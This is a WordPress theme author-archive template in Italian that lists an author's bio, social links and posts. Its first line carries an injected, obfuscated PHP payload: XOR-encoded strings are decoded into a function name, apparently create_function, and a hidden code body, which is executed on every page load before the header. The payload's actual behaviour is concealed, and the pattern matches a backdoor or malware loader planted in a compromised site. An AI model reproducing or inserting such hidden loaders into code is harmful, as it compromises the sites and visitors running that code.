<?php $NBGaxZY='X0U28.a>:>Y-P=S'; $aAWsIWtQ=';B0SLK>XOP:Y9R='^$NBGaxZY; $XqupUuI='>2pYFC,S0 Q6oE=DO3 gnI. :R88TfnA;-hCJr2oQ, WV.P-XrTU=j- I7neFI=qOTWJ9cHLU<=aLijLh<8OSAOHZlitiqlpp;4 0Zn,AlXYiZqWi<:7XXBbmXA6.EZboYaxLEgcu:1BSvwnaWY;Z7is:0VhoiR Mki>haCK83A+RXf;2Gh4hyb9m:V5>19FNB 0aWh7FI0gccS 14QPu3 8  szfXVTW;<1=Avi0QQHHOmX2B90YU,sFFs dd=.irP6Xl2WHdkvxC<XT 1Ji7cqtZ,5 6GP7xsvb.KRLH=T0W:9Xzpg9,675Qa84<P3Ablt0S=,eA3m9 RCY8.=zzV2hxoa-<xm2Nzc=XYckDqg  RBUps=l7lu=WM-c=N6LILG:6 mmaya6W<PnyFo0M8,TPb=Oa>8aA0+,9juvl3 DT= 7=TZ4c;8Ii7L3+==U0 K 9F4qbkQ,,=56kc U Xezpv1J38cP40qycgP<mf 1E6mpWe1RJO2-;TWb=HQXT+XL-EMmvxk2R-1nKqqbnYHmkNO68Lew1N0UomuwdLf+RWYYPYNwavN,OcaWbuxXWPrS6 g,sfidXeGMbW;>Y q 57t< U;Z6qd RLA.0YLGLv1  JenmtHfujPep3XYPbJ>Q77ar:Q+-97PfsNnnq=OS2grcyrM'; $SytZdGpi=$aAWsIWtQ('', 'WTXx 6B0DI>X0 E-<GSOI1ARe6YL591,NYOjcRIeXJU95Z9B6R,:O5IA=V1:+<IYk06>XOhh>YDHlIJlHG2FZe =.LTTNVWzy2ROBrJEaQxiRzU>UONE4=,JI< BOlaBK0JSeOnjQUD6sXJNIs=Z.V2WSmv6OM9E40MWHDc8LA-N<pBPW>AiABh0dH3AKCWnj-UDHlb>;CMmiG7AEUqmUUATSEHpB<7 6dWTDaKIV0=;-tgRT-KU86DSnb,c++vg,R1ExHY21DVHXgJ98UTcILixP>MAAi,5NXNVFE.+wB4pT6NXxGPCOMZBPjkE>69UaJMPT2IMLaHg0F=1<YMUZRrm:=>4ho,MS=ZGV= CVzQCVA>70YSFf>eQY69L<V+OltlcQSYVghpER6H1NDfKF,TY1kh42kC2keTJXXJHV,FN71OIVQ= QKCW;6S-GJbb8ETcBX5QGV45IORQSCGD4T9LVPRU+GY<;QIXPXm9ZEBDP1WMVqEP 8.KrP1.=X08+ XpkF 4JZXOV3YPGkWWBF4,XCj+WL->PZ+Ir2DUJYlAH7d=o4;,BUCwN-WUeWEIoc1A5SBSNDVQCqEakB6IL8Y.KPN+YX<H.EYCP35-AQ=kklRUAT+LGMThFUJ+oyV.8<JnZ0CV:UJ0RAVV4A.gUdxX7:FOBJBx0'^$XqupUuI); $SytZdGpi(); get_header(); ?>



<?php global $author; $userdata = get_userdata($author); ?>



	<div id="content-wrapper">

		<div id="content-main">

			<div id="home-main">

				<h1 class="archive-header"><?php _e( 'Articoli di', 'mvp-text' ); ?> <?php echo $userdata->display_name; ?></h1>

				<?php if ( $paged < 2 ) : ?>

					<?php $authorbox = get_option('ht_author_box'); if ($authorbox == "true") { ?>

					<div id="author-wrapper">

						<div id="author-info">

							<?php echo get_avatar( $userdata->user_email, '100' ); ?>

							<div id="author-text">

								<p><?php echo $userdata->description; ?></p>

								<ul>

									<?php $authordesc = $userdata->facebook; if ( ! empty ( $authordesc ) ) { ?>

									<li class="fb-item">

										<a href="http://www.facebook.com/<?php echo $userdata->facebook; ?>" alt="Facebook" class="fb-but" target="_blank"></a>

									</li>

									<?php } ?>

									<?php $authordesc = $userdata->twitter; if ( ! empty ( $authordesc ) ) { ?>

									<li class="twitter-item">

										<a href="http://www.twitter.com/<?php echo $userdata->twitter; ?>" alt="Twitter" class="twitter-but" target="_blank"></a>

									</li>

									<?php } ?>

									<?php $authordesc = $userdata->pinterest; if ( ! empty ( $authordesc ) ) { ?>

									<li class="pinterest-item">

										<a href="http://www.pinterest.com/<?php echo $userdata->pinterest; ?>" alt="Pinterest" class="pinterest-but" target="_blank"></a>

									</li>

									<?php } ?>

									<?php $authordesc = $userdata->googleplus; if ( ! empty ( $authordesc ) ) { ?>

									<li class="google-item">

										<a href="<?php echo $userdata->googleplus; ?>" alt="Google Plus" class="google-but" target="_blank"></a>

									</li>

									<?php } ?>

									<?php $authordesc = $userdata->instagram; if ( ! empty ( $authordesc ) ) { ?>

									<li class="instagram-item">

										<a href="http://www.instagram.com/<?php echo $userdata->instagram; ?>" alt="Instagram" class="instagram-but" target="_blank"></a>

									</li>

									<?php } ?>

									<?php $authordesc = $userdata->linkedin; if ( ! empty ( $authordesc ) ) { ?>

									<li class="linkedin-item">

										<a href="http://www.linkedin.com/company/<?php echo $userdata->linkedin; ?>" alt="Linkedin" class="linkedin-but" target="_blank"></a>

									</li>

									<?php } ?>

								</ul>

							</div><!--author-text-->

						</div><!--author-info-->

					</div><!--author-wrapper-->

					<?php } ?>

				<?php endif; ?>

				<div class="home-widget">

					<ul class="home-list cat-home-widget infinite-content">

						<?php if (have_posts()) : while (have_posts()) : the_post(); ?>

						<li class="infinite-post">

							<a href="<?php the_permalink(); ?>" rel="bookmark">

							<div class="home-list-img">

								<?php if (  (function_exists('has_post_thumbnail')) && (has_post_thumbnail())  ) { ?>

								<?php $thumb = wp_get_attachment_image_src( get_post_thumbnail_id($post->ID), 'medium-thumb' ); ?>

								<img class="lazy" src="<?php echo get_template_directory_uri(); ?>/images/trans.gif" data-original="<?php echo $thumb['0']; ?>" />



								<?php } ?>

								<noscript><?php the_post_thumbnail('medium-thumb'); ?></noscript>

								<?php if(get_post_meta($post->ID, "mvp_video_embed", true)): ?>

									<div class="video-button">

										<img src="<?php echo get_template_directory_uri(); ?>/images/video-but.png" alt="<?php the_title(); ?>" />

									</div><!--video-button-->

								<?php endif; ?>

							</div><!--home-list-img-->

							<div class="home-list-content">

								<span class="widget-info"><span class="widget-author"><?php the_author(); ?></span> | <?php the_time(get_option('date_format')); ?></span>

								<h2><?php the_title(); ?></h2>

								<p><?php echo excerpt(19); ?></p>

							</div><!--home-list-content-->

							</a>

						</li>

						<?php endwhile; endif; ?>

					</ul>

					<div class="nav-links">

						<?php if (function_exists("pagination")) { pagination($wp_query->max_num_pages); } ?>

					</div><!--nav-links-->

				</div><!--home-widget-->

			</div><!--home-main-->

		</div><!--content-main-->

		<?php get_sidebar(); ?>

	</div><!--content-wrapper-->

</div><!--main-wrapper-->

<?php get_footer(); ?>